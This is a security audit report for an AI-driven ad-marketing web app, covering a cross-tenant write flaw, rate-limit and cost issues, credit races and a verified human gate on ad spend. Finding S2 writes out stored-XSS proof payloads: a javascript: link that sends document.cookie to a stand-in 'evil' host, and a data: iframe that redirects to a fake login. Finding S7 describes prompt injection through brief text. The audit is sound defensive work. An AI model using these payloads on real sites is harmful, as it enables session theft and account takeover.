# AdMaster Pro — Security, Correctness & Reliability Audit

> **Scope.** Full adversarial audit of branch `feat/ai-marketer-epic` (the epic that goes live), covering the living-brain, decision engine, Meta execution, diagnosis loop, billing, and all API surface. Six parallel auditors on disjoint areas: (1) RLS/IDOR/AuthN, (2) secrets/OAuth/webhooks/rate-limiting/deps, (3) injection/XSS/prompt-injection, (4) the money gate, (5) correctness/reliability, (6) code health.
> **Method.** Deep static review + read-only prod-schema probes (service-role, PostgREST — **no prod mutation**) + targeted proof reasoning. `npm run type-check` clean; `npm test` = 581 passed / 4 skipped. `npm audit` run.
> **Date:** 2026-07-03. **Status:** REPORT ONLY — nothing fixed yet. Fix plan in `docs/HARDENING-PLAN.md`.

---

## 0. Headline

**The system is fundamentally well-built for something about to touch real money, and the single most important guarantee holds.** The money gate is airtight *structurally* (below). RLS is genuinely owner-only on every table. Crypto, OAuth CSRF state, and Stripe webhook verification are all correct. `tsc` is strict-clean with zero ignore-directives.

The real exposure is a **cluster of go-live blockers**: one cross-tenant write path on a service-role route, a stored-XSS in public landing pages, and a cost/DoS surface (an ineffective serverless rate limiter in front of an unauthenticated LLM orchestrator). None of these lets anyone spend ad money — but the first two are tenant-safety/account-takeover class, and the third is a real bill-multiplier. Plus a set of reliability bugs (concurrent double-charge, un-refunded autopilot credit loss, a stale schema read) that will bite under real traffic.

### 💰 MONEY-GATE VERDICT — the no-spend-without-human guarantee **HOLDS, structurally**

I tried to construct a path that spends real ad money without an explicit human action in Meta Ads Manager and **could not**. It rests on three independent layers, any one of which alone blocks spend:

1. **Every Meta object is created `PAUSED`, unconditionally** — hard-coded at `lib/campaigns/publish.ts:264/275/291`, `lib/campaigns/runner.ts:228/239/254`, and defaulted in every Meta-ads builder (`campaigns.ts:19`, `adsets.ts:64`, `ads.ts:20`). No caller ever passes `ACTIVE`.
2. **There is no code anywhere that unpauses/activates a Meta object.** `MetaAdsClient` exposes only `create*` methods over a single create-only `post()` primitive — no update/PATCH/status-change method exists (`lib/meta-ads/client.ts`, `index.ts`). The only literal `'ACTIVE'` outside the type union is a read-only Ad-Library search filter. To spend, a human must log into Meta Ads Manager and unpause by hand.
3. **The live path is double-gated and fails CLOSED** — live runs only when `LIVE_PUBLISH_ENABLED === 'true'` AND a token resolves AND budget ≤ spend cap (`publish.ts:216-252`); both Meta clients default `dryRun ?? true`, so env drift defaults to dry-run, never live.

The user-clickable "resume/approve" in the Command Center writes only the `campaigns.status` DB column and never calls Meta (`app/api/command-center/campaigns/[id]/route.ts`) — a DB status of `active` is cosmetic while the Meta object stays PAUSED. Existing tests already encode all of this (`tests/campaigns/publish.test.ts`: "NEVER produces an ACTIVE object", flag-off refusal, over-budget refusal).

**One forward-looking caveat (R1 below):** the autopilot `launch` step is ungated but calls a route that *does not exist in this branch* (404 no-op). It becomes a real risk only when the sibling `feat/meta-ads-launcher` branch merges — gate it first.

---

## ✅ Remediation status (2026-07-03)

All **CRITICAL + HIGH** findings are **FIXED + test-proven** and committed to `feat/ai-marketer-epic`:

- **Wave 1** (`9a96430`, mig `032`): **S1** ✅ (CRITICAL, tests e/f) · **S2** ✅ · **S3** ✅ · **S4** ✅ · **C1** ✅ (test g) · **S6** ✅ · **Q1** ✅
- **Wave 2/3** (`b5e74af`, mig `033`): **C2/H2** ✅ · **C4** ✅ · **C5** ✅ · **C6** ✅ · **H1** ✅ · **S7/S11** ✅
- **S5** (Next.js CVEs) — IN-FLIGHT in an isolated worktree/branch (2-major bump; own PR when green).
- **R1** — a documented merge-gate on the sibling `feat/meta-ads-launcher` branch (not this branch).
- Remaining MED/LOW (S8/S9/S10/S12/M3/L1) are non-blocking, tracked for follow-up.

Verified green at each wave: tsc clean · 642 tests · prod build 110/110. Money gate unchanged (structural).

---

## 1. Findings — global severity ranking

| # | Sev | Area | Finding | Location |
|---|-----|------|---------|----------|
| **S1** | 🔴 **CRITICAL** | RLS/IDOR | `/api/client-core/run` trusts a caller-supplied `clientId` under the service-role client → cross-tenant read/mutate of another tenant's insights + hijack of their `client_strategy` owner | `app/api/client-core/run/route.ts:19-41`, `lib/client-core/orchestrator.ts:67-133` |
| **S2** | 🟠 HIGH | XSS | Stored XSS in public landing pages — `cta_href` (`<a href>`) and `video_url` (`<iframe src>`) rendered unsanitized; no CSP; same-origin as dashboard → session theft | `app/lp/[slug]/page.tsx:519,538`, `app/api/landing/route.ts:102-105` |
| **S3** | 🟠 HIGH | DoS | In-memory rate limiter is ineffective on serverless (per-instance `Map`, resets on cold start, XFF-spoofable) — the *sole* defense on every public endpoint | `lib/rate-limit.ts:6` |
| **S4** | 🟠 HIGH | DoS/cost | Public unauthenticated `briefs/submit` fires an unbounded multi-call LLM orchestrator with **no credit gating** (`force:true`, `maxDuration=300`) | `app/api/briefs/submit/route.ts:17,126-137` |
| **C1** | 🟠 HIGH | Correctness | Concurrent brief submits (or submit racing `/client-core/run`) double-build the core → **duplicate insight atoms + double credit charge** (`force:true` bypasses idempotency) | `app/api/briefs/submit/route.ts:132`, `lib/client-core/orchestrator.ts:87`, `lib/intelligence/insights.ts:82-98` |
| **C2** | 🟠 HIGH | Reliability | `autopilot/run` has no `maxDuration` and drives a multi-LLM pipeline over self-HTTP → serverless timeout truncates it, refund never runs → **silently lost credits + orphaned `running` rows** | `app/api/autopilot/run/route.ts`, `lib/autopilot/steps.ts:19` |
| **S5** | 🟠 HIGH | Deps | Next.js `14.2.35` carries 9 HIGH advisories (Server-Component DoS, image-opt DoS, cache poisoning, App-Router XSS, WS SSRF) | `package.json` |
| **H1** | 🟠 HIGH | Code health | No runtime-validation boundary anywhere — every LLM/JSONB response is `JSON.parse`d and blind-cast (`as T`); the strategist→`business_analysis`→decision-engine→publish chain is trusted on structure end-to-end | `lib/campaigns/runner.ts:152` + ~15 sites |
| **Q1** | 🟠 HIGH | Schema drift | No migration defines the `briefs(client_id)` UNIQUE the submit-upsert needs. **Prod carries an undocumented `briefs_client_uniq` (works today)** — but any fresh rebuild from `supabase/migrations` will 500 on every client-linked submit | `app/api/briefs/submit/route.ts:74-100` vs `014_brief_client_link.sql:18` |
| **R1** | 🟠 HIGH (forward-looking) | Money gate | Autopilot `launch` step is ungated (ignores `LIVE_PUBLISH_ENABLED`/spend-cap) and auto-cascades from a **copy** approval; safe only because `/api/meta/launch` is absent in this branch | `lib/autopilot/steps.ts:141-149`, `app/api/autopilot/resume/route.ts:45-48` |
| **S6** | 🟡 MED | DoS/cost | `competitor` and `reports` make Anthropic calls with **no credit deduction and no rate limit** — any free-tier user loops them to bypass the credit model | `app/api/competitor/route.ts:53`, `app/api/reports/route.ts:64` |
| **S7** | 🟡 MED | Prompt injection | Brief text concatenated into analysis prompts with no untrusted-data fence → a hostile brief can forge `[INSIGHTS]` rows (self-tenant poisoning; **cannot** cross tenants — verified) | `lib/intelligence/analyze.ts:85`, `lib/analyze-brief.ts:150` |
| **S8** | 🟡 MED | IDOR (latent) | Campaign store mutations filter by `id` only under the admin client (no owner scope) — not reachable today, but a live-publish-path trap | `lib/campaigns/store.ts:115-161` |
| **C3** | 🟡 MED | Correctness | `images` route reads `meta_clients.avatar` — **column absent on prod** (probe-confirmed); error swallowed → avatar image-grounding silently dead (v2 avatar lives on `client_strategy.avatar`) | `app/api/images/route.ts:290` |
| **C4** | 🟡 MED | Race | Learning-signal apply is a non-atomic read-modify-write with no dedupe (`processed` flag set but never checked) → double-count / lost-update on repeated ✓/✗ | `app/api/intelligence/signal/route.ts:74-131`, `lib/intelligence/lifecycle.ts:220-261` |
| **C5** | 🟡 MED | Idempotency | `content_performance` insert has no unique key; `auto-improve` re-applies performance signals with no per-diagnosis guard → repeated weakening of the same atoms on re-ingest | `lib/performance/ingest.ts:258`, `lib/diagnosis/auto-improve.ts:217-267` |
| **C6** | 🟡 MED | Correctness | Orchestrator stamps `core_generated_at` ("brain ready") **even when analyze fully failed** → dashboard shows ready over an empty/stale strategy | `lib/client-core/orchestrator.ts:126-134` |
| **C7** | 🟡 MED | Error handling | Silent `catch {}` in `schedule`/`meta/clients`/`pixel`; notably `publish.ts:461` turns a DB error into empty creative → a (gated) live publish could ship a placeholder | `lib/campaigns/publish.ts:461` + 3 routes |
| **H2** | 🟡 MED | Code health | Autopilot orchestrator's inter-step data bus is fully `any` → a misspelled key between steps fails silently on the automated publish path | `lib/autopilot/orchestrator.ts:42,57,74` |
| **H3** | 🟡 MED | Test gap | The credit gate (`lib/credits.ts`) has **no direct test** — it's mocked in every test that touches it; the 402 branch and refund-swallow are asserted nowhere | `lib/credits.ts:12-50` |
| **H4** | 🟡 MED | Type safety | Credits webhook casts untyped RPC return / PG error code (`as any`) / Stripe metadata → indexes `PLAN_CONFIG` by an unvalidated string | `app/api/credits/webhook/route.ts:29,36,64` |
| **M1** | 🟡 MED | Contracts | Inconsistent API success/error envelopes (`{ok}`/`{success}`/`{received}`/`{valid}`/bare arrays; 500 vs 502); `req.json()` outside try → unhandled 500 | `app/api/landing/generate/route.ts:27`, `tools/route.ts:30`, +sample |
| **M2** | 🟡 MED | Silent failure | Routes return 200 while ignoring a failed DB write — incl. the credits **webhook** (dropped grant is invisible, Stripe won't retry) | `credits/webhook/route.ts:67,89,101`, `team`, `approvals` |
| **F8** | 🟡 MED | Money integrity | Stripe top-up grant is a non-atomic read-modify-write → concurrent events can under-grant (never over-grant); should be an atomic RPC like `deduct_credits` | `app/api/credits/webhook/route.ts:44-53` |
| **D2/D3** | 🟡 MED | Dead/dup | ~600 lines of orphaned avatar modules (incl. the self-declared "single source of truth"); the one live avatar prompt is duplicated inside a React page | `lib/client-core/avatar.ts`, `lib/avatar/{generator,research}.ts`, `app/(dashboard)/briefs/page.tsx:36-52` |
| **D4** | 🟡 MED | Maintainability | No `requireUser` helper — the 401 auth block is copy-pasted **79× across 51 routes** (79 chances to differ) | repo-wide |
| **D5** | 🟡 MED | Maintainability | No shared Anthropic wrapper — `new Anthropic()` built 18× with repeated model/max-token boilerplate; no shared retry/validation | repo-wide |
| **S9** | 🟢 LOW | Auth | Manual brief `code` is `Math.random`, 6 chars, yet accepted as a sufficient credential on the public submit path | `app/api/briefs/code/issue.ts:22`, `briefs/submit/route.ts:57` |
| **S10** | 🟢 LOW | Tokens | `approvals/public` tokens (128-bit, fine) have no expiry and no rate limit on the respond RPC | `app/api/approvals/public/route.ts` |
| **S11** | 🟢 LOW | Integrity | `parseAnalysis` doesn't validate `kind ∈ KINDS[layer]`; a forged atom at confidence 1.0 can force-supersede a legit singleton atom (same-tenant) | `lib/intelligence/analyze.ts:123` |
| **S12** | 🟢 LOW | RLS | `briefs_client_insert` policy doesn't bind `user_id` to the code owner → an authed user can inject a brief row into another marketer's inbox (write-only, no read leak) | `supabase/migrations/001_schema.sql:151-154` |
| **M3** | 🟢 LOW | UX/correctness | `credits` GET silently returns `0` on a DB read error (misleads balance display) | `app/api/credits/route.ts:94-97` |
| **L1** | 🟢 LOW | Dead code | `monthly_budget` branch in the budget engine is unreachable — column absent on prod, runner never populates it | `lib/decision-engine/budget.ts:51-58` |

**Counts:** 1 CRITICAL · 8 HIGH · 15 MEDIUM · 6 LOW.

---

## 2. Detailed findings

### 🔴 CRITICAL

#### S1 — `/api/client-core/run` cross-tenant write under the service-role client (BOLA)
- **What.** The route authenticates the caller, then calls `orchestrateClientCore(createAdminClient(), { userId, clientId, briefId, force })` with a **body-supplied `clientId`**. The orchestrator verifies the *brief* is owned by the caller but only cross-checks `clientId` **when `brief.client_id` is non-null** (`orchestrator.ts:75`). A brief with `client_id = null` makes `clientId` fully attacker-controlled. Because the admin client bypasses RLS and the intelligence layer scopes by `client_id` only (`listActiveInsights` / `supersedeInsight` / `updateInsightConfidence`), the attacker can read the victim's active insights into the analysis context, supersede/mutate the victim's atoms, and — via the `client_strategy` upsert `onConflict:'client_id'` with `owner_user_id: attacker` over the `unique(client_id)` constraint — **overwrite the victim's `client_strategy` row and flip its owner to the attacker**.
- **Proof (exploit chain).** (1) Attacker creates a brief with no client → owns a `briefs` row with `client_id = null`. (2) Attacker obtains a victim `clientId` UUID — **these appear in dashboard URLs (`/clients/[id]`), share links, referrers, screenshots**, so this is realistically obtainable, which is why I rate it CRITICAL rather than HIGH. (3) `POST /api/client-core/run { briefId: <attacker>, clientId: <victim>, force: true }`. (4) Owner check on the brief passes; the null-`client_id` skips the mismatch guard; idempotency read (scoped to attacker) returns null → proceeds. (5) Victim's insights are read + reconciled/superseded; the stamp upsert rewrites `client_strategy(owner_user_id = attacker)`.
- **Blast radius.** Cross-tenant corruption of another client's living-knowledge core (the product's central IP and the input to every marketing decision) + ownership hijack of their strategy row. For a system about to spend money off those insights, poisoning them is materially dangerous.
- **Fix.** Before any work, verify `clients.owner_user_id = caller` (use the **user** client so RLS + explicit filter both apply), and require `brief.client_id === clientId` unconditionally (drop the null-brief bypass). Defense-in-depth: thread `owner_user_id` into `listActiveInsights`/reconcile/synthesize so the data layer is owner-scoped even under the admin client.

---

### 🟠 HIGH

#### S2 — Stored XSS in public landing pages (no CSP)
- **What.** The public LP renderer outputs two URL-scheme-sensitive fields unsanitized: `app/lp/[slug]/page.tsx:519` `<a href={c.cta_href}>` (a `javascript:` URL executes on click, same-origin as the dashboard) and `:538` `<iframe src={c.video_url} …>` with **no `sandbox` and no host allow-list** (arbitrary origin / `data:text/html` / `top.location` redirect at page load). `landing_pages.content` is free-form JSON written verbatim by `POST`/`PATCH /api/landing` (`route.ts:102-105` allow-lists `content` and stores it as-is), so any authenticated tenant can `curl` these fields in and publish. There is **no CSP** anywhere (`next.config.js`/`middleware.ts`), and React escaping doesn't help — the values land in `href`/`src` **attributes**.
- **Proof.** `PATCH /api/landing?id=<own>` with `{"content":{...,"cta_href":"javascript:fetch('https://evil/?c='+document.cookie)"}}` then publish → click runs JS on-origin; `video_url:"data:text/html,<script>top.location='https://evil/login'</script>"` executes at load.
- **Blast radius.** The public LP is same-origin as the authenticated dashboard → Supabase session/cookie theft → **account takeover** of any authenticated viewer (staff reviewing a page, another tenant). For anonymous lead visitors: drive-by / phishing on a trusted marketing domain, next to a live lead-capture form. `video_url`/iframe fires at load (worse than the click-gated CTA).
- **Fix.** A shared `safeExternalUrl()` allow-listing `http(s):`/`mailto:`/`tel:` applied at **both write and render**; iframe host allow-list (youtube/vimeo) + `sandbox`; a global CSP (`script-src 'self'`, `frame-src` allow-list) as defense-in-depth (styling is inline/styled-jsx, so a script-only CSP won't break the page).

#### S3 — In-memory rate limiter is ineffective on serverless
- **What.** `lib/rate-limit.ts:6` keeps buckets in a module-scoped `Map`. On Vercel each instance has its own, and instances scale out, so the effective limit is `max × #instances` and resets on every cold start. It's keyed on the first `x-forwarded-for` hop, which is spoofable. This limiter is the **sole** defense on every public endpoint (`briefs/submit`, `meta/connect/[token]`, `brief/[token]`, `report/[token]`).
- **Blast radius.** The multiplier that turns S4/S6 into real cost/DoS. (256-bit tokens still resist enumeration, so the practical damage is cost/DoS, not disclosure.)
- **Fix.** Back the limiter with a durable store (Upstash/Vercel KV), keyed per-user and per-IP, using a trusted IP source — keep the existing API so callers don't change.

#### S4 — Public `briefs/submit` runs an unbounded LLM orchestrator with no credit gate
- **What.** `POST /api/briefs/submit` is unauthenticated and, on every valid submit, `waitUntil`s `orchestrateClientCore(..., force:true)` — several sequential Anthropic calls (`maxDuration=300`). **No `deductCredits` anywhere on this path.** Access needs a 64-hex token *or* the weak 6-char `code` (S9), and `force:true` re-runs the full pipeline on every replay. The only throttle is the ineffective S3 limiter.
- **Blast radius.** Unbounded Anthropic bill + function-time exhaustion driven by an unauthenticated caller who holds/guesses one brief link. Direct financial DoS.
- **Fix.** Gate the orchestrator run behind the owning agency's credit balance (or a hard per-client daily cap); enforce single-run idempotency per brief version instead of `force:true` on the public path; put the throttle on the durable store (S3).

#### C1 — Concurrent brief submits double-build the core (dup atoms + double charge)
- **What.** The submit upsert collapses to one brief row, but each submit fires the orchestrator with `force:true`, **bypassing the idempotency guard** (`orchestrator.ts:87`). Two near-simultaneous runs (double-click, retry, or a submit racing the authed `/api/client-core/run` safety net) run `analyzeToInsights` + `reconcileCandidates` concurrently. Cross-run dedup is only against an **in-memory** snapshot (`lifecycle.ts:138`) and `createInsight` is an unconditional INSERT with no natural-key uniqueness — so the same candidates insert **twice** as separate atoms, permanently polluting the knowledge base and skewing `synthesizeStrategy`. Each run also `deductCredits(analyze_brief)` + `deductCredits(avatar)` → the client is **charged 2×**.
- **Fix.** Serialize per client (advisory lock or a compare-and-set `core_building_at` claim before analyze); make `createInsight` idempotent (`on conflict do nothing` on a natural key); charge credits only for the single winning build.

#### C2 — `autopilot/run` has no `maxDuration` → truncation + un-refunded credit loss
- **What.** The route deducts an orchestration credit then `await`s a pipeline that calls the app's own API routes over HTTP, each an LLM round-trip. With **no `export const maxDuration`**, the function hits the short platform default and can be killed mid-pipeline. The refund (`refundExplicit`) only runs in the catch/failure branch — a hard timeout kills the function first, so the credit is **silently lost** and `autopilot_runs.status` stays `running` forever.
- **Fix.** `export const maxDuration = 300`; make the run resumable/idempotent from `autopilot_runs.current_step`; refund via a reconciler that sweeps stale `running` rows (not only the in-request catch); prefer in-process calls over self-HTTP.

#### S5 — Next.js 14.2.35: 9 HIGH advisories
- **What.** `npm audit`: 11 vulns (2 moderate, 9 high) on `next@14.2.35` — Server-Component DoS (GHSA-q4gf-8mx6-v5v3, GHSA-8h8q-6873-q5fj), image-opt DoS, cache poisoning (GHSA-3g8h-86w9-wvmq, GHSA-wfc6-r584-vfw7), App-Router XSS, WS SSRF. Cache poisoning of authenticated responses is the sharpest for an app managing Meta accounts.
- **Fix.** Upgrade to a patched Next.js (latest 14.2.x if it covers these, else plan the 15/16 migration on its own PR). Re-run `npm audit` to confirm.

#### H1 — No runtime-validation boundary on the LLM/DB → decision → spend chain
- **What.** No schema-validation library exists; every LLM response and JSONB column is `JSON.parse`d and immediately cast (`as T` / `as unknown as X`) with zero structural checks. Worst: `lib/campaigns/runner.ts:152` feeds the persisted (LLM-produced) `business_analysis` into the decision engine as a trusted `StrategyAnalysis`. A malformed/partially-null LLM object propagates as a "valid" typed object; the first symptom is a bad campaign, not a caught error.
- **Fix.** A validation boundary (zod or hand-written guards) at two seams: after every LLM `JSON.parse`, and when reading strategy JSONB. Fail loud, don't cast.

#### Q1 — `briefs(client_id)` unique constraint missing from migrations (drift bomb)
- **What.** `briefs/submit` upserts `onConflict:'client_id'`, which requires a UNIQUE/exclusion constraint on `briefs(client_id)`; migration 014 creates only a **non-unique** index. **Prod works today because it carries an undocumented `briefs_client_uniq`** (confirmed this session — the brief-v2 resubmit raised exactly that duplicate-key error), so this is *not* a live outage. But it is a genuine drift bomb: any environment rebuilt from `supabase/migrations` (staging, DR, a new region) will raise `42P10` and **500 on every client-linked submit**.
- **Fix.** Add `create unique index if not exists briefs_client_id_uniq on public.briefs(client_id) where client_id is not null;` so code and schema agree everywhere. Additive/idempotent — show SQL, then apply.

#### R1 — Autopilot `launch` step is ungated (forward-looking)
- **What.** The autopilot pipeline includes a `launch` step that POSTs to `/api/meta/launch` after a human **copy** approval, and `resume()` auto-cascades to it — **without** consulting `LIVE_PUBLISH_ENABLED` or the spend cap. Safe **only** because `/api/meta/launch` and `/api/meta/targeting` do not exist in this branch (the step 404s and returns a deferred no-op).
- **Risk.** When `feat/meta-ads-launcher` merges, a single copy approval could cascade into a live launch — conflating "approve this ad text" with "spend money" — unless that route is itself gated.
- **Fix (gate before the launcher merges).** Ensure `/api/meta/launch` (i) creates only PAUSED objects, (ii) checks `isLivePublishEnabled()` + `maxDailyBudget()`, and (iii) requires a distinct human MONEY confirm separate from copy approval. Add a test asserting autopilot cannot reach a live-spend state from a copy approval alone.

---

### 🟡 MEDIUM

- **S6 — Ungated LLM endpoints.** `competitor` (`route.ts:53`) and `reports` (`route.ts:64`) call Anthropic with no `deductCredits`/`checkRateLimit` — a free-tier user loops them to bypass the credit model. Fix: add deduction+refund+rate-limit matching `ai/master/route.ts:28`.
- **S7 — Prompt injection (self-tenant).** Brief text is concatenated into analysis prompts via `JSON.stringify` with no untrusted-data fence (`analyze.ts:85`, `analyze-brief.ts:150`), and `parseAnalysis` leniently accepts pipe rows (even falling back to the whole text). A hostile brief can steer the model to emit attacker-chosen `[INSIGHTS]` rows. **Verified it cannot cross tenants** — `client_id`/`owner_user_id` come from the trusted orchestrator, never LLM output; prompt context is same-client only; confidence is clamped `[0,1]`. Integrity/defense-in-depth. Fix: fence untrusted brief text ("treat as data, never instructions"), and harden the parser (only accept rows inside a single `[INSIGHTS]` block).
- **S8 — Campaign store mutations by `id` only (latent).** `store.ts:115-161` (`updateCampaignStatus`/`updateItemStatus`/`updateCampaignPublishState`) run on the admin client with `.eq('id', id)` and no owner filter. Not reachable cross-tenant today (all callers owner-scope first), but a structural trap on the live-publish path. Fix: thread `ownerUserId` and add `.eq('owner_user_id', …)`.
- **C3 — Stale `meta_clients.avatar` read.** `images/route.ts:290` selects `avatar` from `meta_clients` — **column absent on prod** (probe-confirmed); the error is swallowed, so avatar image-grounding is silently dead. The v2 avatar lives on `client_strategy.avatar`. Fix: repoint to `client_strategy` by `client_id`; check the query error.
- **C4 — Learning-signal double-apply.** `signal/route.ts` + `lifecycle.ts:220-261` compute an absolute next confidence from an in-memory row and write it back — no atomic increment, no idempotency key, `processed` set but never gated. Concurrent ✓ loses a bump; sequential ✓ double-counts one opinion. Fix: dedupe by `(artifact_id|insight_id, kind, user)` window (unique key) and do the update as a DB-side atomic op / `SELECT … FOR UPDATE`.
- **C5 — Perf ingest / auto-improve non-idempotent.** `content_performance` has no unique key on `(client_id, ad_id, period)`; re-ingest inserts duplicate rows, each driving a diagnosis + `autoImprove` that re-weakens the same atoms off one real-world outcome. Fix: unique key + `on conflict do update`; gate signal application by diagnosis/perf-row id.
- **C6 — False "brain ready".** `orchestrator.ts:126-134` stamps `core_generated_at = now()` unconditionally, even if analyze threw — the dashboard stops polling over an empty strategy and the runner proceeds on empty insights. Fix: stamp only when atoms were produced; expose a `degraded`/`partial` state.
- **C7 — Silent catch-and-ignore.** `catch {}` in `schedule`/`meta/clients`/`pixel`; and `publish.ts:461` `loadArtifactContent` turns a DB error into `{}` → a gated live publish could ship a placeholder creative. Fix: log every swallow; in publish.ts, distinguish "no artifact" from "load failed" and refuse.
- **H2 — Untyped autopilot bus.** `orchestrator.ts:42/57/74` thread `Record<string, any>` between steps; a misspelled key fails silently on the automated publish path. Fix: a typed `PipelineAcc` + typed `STEP_FNS`.
- **H3 — Credit gate untested.** `lib/credits.ts` is mocked in every test; the 402 branch, RPC-return cast, and refund-swallow are asserted nowhere. Fix: a direct unit test with a fake `supabase.rpc` (happy / RPC-error / insufficient / invalid-action / refund-error).
- **H4 — Untyped money-path casts.** `credits/webhook`: `data.credits as number`, `(idemErr as any).code === '23505'`, Stripe metadata cast then used to index `PLAN_CONFIG`. Fix: type the RPC return; typed PG-error guard; validate metadata before indexing.
- **M1 — Inconsistent API contracts.** Success-shape zoo (`{ok}`/`{success}`/`{received}`/`{valid}`/bare arrays), 500 vs 502, and `req.json()` outside try (`landing/generate:27`, `tools:30`) → unhandled 500 on a malformed body. Fix: a `{ok,data}`/`{ok:false,error}` envelope helper; move `req.json()` inside try.
- **M2 — 200 over failed DB writes.** `team` DELETE/PATCH, `approvals` DELETE, and the credits **webhook** never check `update()` errors → a dropped credit grant is invisible and Stripe won't retry. Fix: check `error` on every mutation; 500/throw on webhook writes.
- **F8 — Non-atomic top-up grant.** `webhook/route.ts:44-53` does `SELECT credits` then `UPDATE credits = current + purchased`; concurrent events can under-grant (never over-grant, never without a Stripe-verified paid event — idempotency by `event.id` holds). Fix: an atomic `add_credits` `SECURITY DEFINER` RPC, mirroring `deduct_credits`.
- **D2/D3 — Dead + duplicated avatar code.** Three orphaned modules (`lib/client-core/avatar.ts`, `lib/avatar/generator.ts`, `lib/avatar/research.ts`, ~600 lines, zero importers) — including the self-declared "single source of truth"; the only live avatar prompt is inlined in `app/(dashboard)/briefs/page.tsx:36-52` and duplicated verbatim in the dead module. Fix: delete the three; extract the live prompt to one shared module.
- **D4 — No `requireUser` helper.** The 401 block is copy-pasted 79× across 51 routes. Fix: one `requireUser(supabase)` → collapse all sites (also makes the auth contract auditable).
- **D5 — No shared Anthropic wrapper.** `new Anthropic()` built 18× with repeated model/max-token boilerplate and no shared retry/validation. Fix: a `getAnthropic()` + `callClaude()` wrapper — the natural home for H1's validation.

---

### 🟢 LOW

- **S9 — Weak brief `code`.** `Math.random`, 6 base36 chars, accepted as a credential on the public submit path — combined with S3/S4, enables guessing toward issued codes, each hit an orchestrator run. Fix: require the 64-hex token on public submit, or CSPRNG the code + durable guess-limit.
- **S10 — Approval tokens.** 128-bit (fine) but no expiry and no rate limit on the public respond RPC. Fix: add expiry + durable per-IP limit.
- **S11 — Unvalidated `kind` + forced supersede.** `parseAnalysis` accepts any `kind`; a forged atom at confidence 1.0 with a valid singleton kind can evict a legit atom (same-tenant). Fix: drop rows where `kind ∉ KINDS[layer]`; don't let a `source:'brief'` candidate reach DECISIVE without corroboration.
- **S12 — `briefs_client_insert` RLS.** Policy checks only that `code` is visible, not that `user_id` matches the code owner → an authed user can inject a brief into another marketer's inbox (write-only, no read leak; does not trigger the orchestrator). Fix: bind `user_id` to the code owner in the policy, or drop the authed insert policy and rely on the service-role submit path.
- **M3 — Credits GET fakes 0 on error.** `credits/route.ts:94-97` ignores the read `error` and returns `0`. Fix: read `error`; 500 on failure.
- **L1 — Dead `monthly_budget` branch.** `budget.ts:51-58` prefers `client.monthly_budget`, but the column is absent on prod and the runner never sets it. Fix: add the column + load it, or remove the branch.

---

## 3. Verified SAFE (no action needed)

- **RLS — owner-only, enabled on every user table** incl. all 026–031 tables (`clients`, `client_strategy`, `client_insights`, `content_artifacts`, `learning_signals`, `insight_events`, `campaigns`, `campaign_items`, `campaign_decisions`, `content_performance`, `diagnoses`, `whatsapp_messages`, `meta_connections`, `report_shares`). Only `using(true)` policies are the public catalog + intentional insert-only forms; the historical over-broad `contacts` select was fixed in `008`.
- **AuthN** — session via `@supabase/ssr` cookies verified with `auth.getUser()` (server-side JWT validation), middleware skips `/api/*` so each route enforces its own 401, no route trusts a client-supplied user id for identity, cookie flags are the secure `@supabase/ssr` defaults.
- **Crypto** — AES-256-GCM, fresh 12-byte IV per encrypt, auth tag verified, key length-validated; Meta tokens encrypted at rest before insert.
- **Meta OAuth CSRF** — HS256-signed state, `timingSafeEqual`, 600s TTL, bound to userId/connectToken, callback re-checks session match + single-use token. Open-redirect blocked by `safeNextPath`.
- **Stripe webhook** — signature verified with `STRIPE_WEBHOOK_SECRET` on the raw body before trust; replay/duplicate guarded by a `stripe_events` PK insert. Credit **deduction** is atomic (`SELECT … FOR UPDATE` `SECURITY DEFINER` RPC; direct `users.credits` UPDATE revoked from `authenticated`).
- **Secrets hygiene** — no `NEXT_PUBLIC_` on any secret, none shipped to a client component, none logged; `.env*` gitignored; **no real secret value ever committed** (git `-S` history scan matched only `.env.example` placeholders).
- **Share/connect/brief/report tokens** — 256-bit CSPRNG, expiry, single-use, regex-prechecked, uniform invalid/expired responses. Enumeration infeasible even with the weak limiter.
- **No SQL injection** — all `.rpc()` calls pass bound params; every `.or/.filter` hit is a JS array filter; no raw SQL, no `pg`/`node-postgres`, no `SUPABASE_DB_URL` concatenation.
- **No other XSS** — zero `dangerouslySetInnerHTML`/`innerHTML`/`document.write` in the repo; all other AI/user text is React-escaped.
- **Money math** — `report-metrics.ts` and `decide.ts` handle empty-insights/NaN/null-strategy/div-by-zero cleanly, never fabricating ROAS.
- **Serverless** — `briefs/submit` genuinely uses `waitUntil` + `maxDuration=300` (the documented fix is real); no raw `pg` pool anywhere → no connection-pool exhaustion. (`autopilot/run` is the one gap — C2.)
- **Prod schema** — migrations 026–031 match prod for every AI-marketer hot table and column the code selects (read-only probe). Only absent columns: legacy `meta_clients.business_analysis`/`avatar` and `clients.monthly_budget` (C3/L1).

---

*Full per-area fragments retained in `scratchpad/audit/01-06`. Ordered remediation in `docs/HARDENING-PLAN.md`.*
